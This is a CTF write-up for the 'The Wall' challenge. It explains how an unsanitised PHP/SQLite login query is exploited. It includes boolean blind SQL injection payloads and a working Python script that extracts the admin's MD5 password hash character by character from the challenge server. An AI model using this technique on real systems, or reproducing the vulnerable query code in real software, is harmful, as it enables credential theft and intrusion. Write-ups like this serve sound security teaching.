# Challenge

Night king needs the secret flag to destroy the wall. Help night king get flag from LordCommander(admin) so that army of dead can kill the living.

http://163.172.176.29/WALL

# Walkthrough/Solution

Source of the login page: 

```
<html>
<head>
<title>The Wall</title>
</head>
<body>
<form action="index.php" method="POST">
Username:<input type="text" name="life" /><br>
Password:<input type="password" name="soul" /><br>
<input type="submit">
</form>
<br>
Here is the sourec of <a href="source.php">index.php</a>
</body>
</html>
```
And we are given source of index.php: 
```
<html>
<head>
<title>The Wall</title>
</head>
<body>
<?php
include 'flag.php';
if(isset($_REQUEST['life'])&&isset($_REQUEST['soul'])){
    $username = $_REQUEST['life'];
    $password = $_REQUEST['soul'];
    if(!(is_string($username)&&is_string($password))){
        header( "refresh:1;url=login.html");
        die("You are not allowed south of wall");
    }
    $password = md5($password);
    include 'connection.php';
    /*CREATE TABLE IF NOT EXISTS users(id INTEGER PRIMARY KEY AUTOINCREMENT,username TEXT,password TEXT,role TEXT)*/
    $message = "";
    if(preg_match('/(union|\|)/i', $username)){
        $message="Dead work alone not in UNIONs"."</br>";
        echo $message;
        die();
    }
    $query = "SELECT * FROM users WHERE username='$username'";
    $result = $pdo->query($query);
    $users = $result->fetchArray(SQLITE3_ASSOC);
    if($users) {
        if($password == $users['password']){
            if($users['role']=="admin"){
                echo "Here is your flag: $flag";
            }elseif($users['role']=="normal"){
                $message = "Welcome, ".$users['users']."</br>";
                $message.= "Unfortunately, only Lord Commander can access flag";
            }else{
                $message = "What did you do?";
            }
        }
        else{
            $message = "Wrong identity for : ".$users['username'];
        }
    }
    else{
        $message = "No such person exists"."<br>";
    }
    echo $message;
}else{
    header( "refresh:1;url=login.html");
    die("Only living can cross The Wall");
}
?>
</body>
</html>
```
Things to note here:
1. We are given the username (LordCommander).
2. Password is hashed using md5 before sending it to the server. This means that the database probably stores the md5 hash of LordCommander's password.
3. Not allowed to use `UNION` and we probably would not need to.

Trying a simple payload `LordCommander' and LOWER(password) LIKE '%` returns us `Wrong identity for LordCommander` and the payload `LordCommander' and password = 'random` returns us `No such person exists`.

The information collected from the two different payloads corresponds to this block of code:
```
    if($users) {
        if($password == $users['password']){
            if($users['role']=="admin"){
                echo "Here is your flag: $flag";
            }elseif($users['role']=="normal"){
                $message = "Welcome, ".$users['users']."</br>";
                $message.= "Unfortunately, only Lord Commander can access flag";
            }else{
                $message = "What did you do?";
            }
        }
        else{
            $message = "Wrong identity for : ".$users['username']; // prints this message after trying 1st payload
        }
    }
    else{
        $message = "No such person exists"."<br>"; // prints this message after trying 2nd payload
    }
```
With that, we can use the first query to bruteforce a md5 password (of length 32).

Here's a script I wrote to solve the challenge. It can be more efficient by performing binary search but this is simpler to understand:

```
import requests
import string

indexPage = "http://163.172.176.29/WALL/index.php"

client = requests.Session()
password = ""
perm = string.digits + string.letters

while len(password) != 32:

    for i in perm:
        query = "LordCommander\' and LOWER(password) LIKE \'" + password + i + "%"

        payload = {'life':query, 'soul':'randomstring'}
        html = client.post(indexPage,data=payload).text

        if "No such person exists" in html:
            continue
        else:
            password += i
            print "Currently checking password: %s" % password
            print "Current length of password: %d" % len(password)

print "Admin's username is LordCommander and the password (in md5) is %s" % password
```
![](https://github.com/tanhengyeow/ctf-journal/blob/master/backdoorctf17/the-wall/src/thewall.png)

# Learning outcome
1. Blind SQLi through python scripting
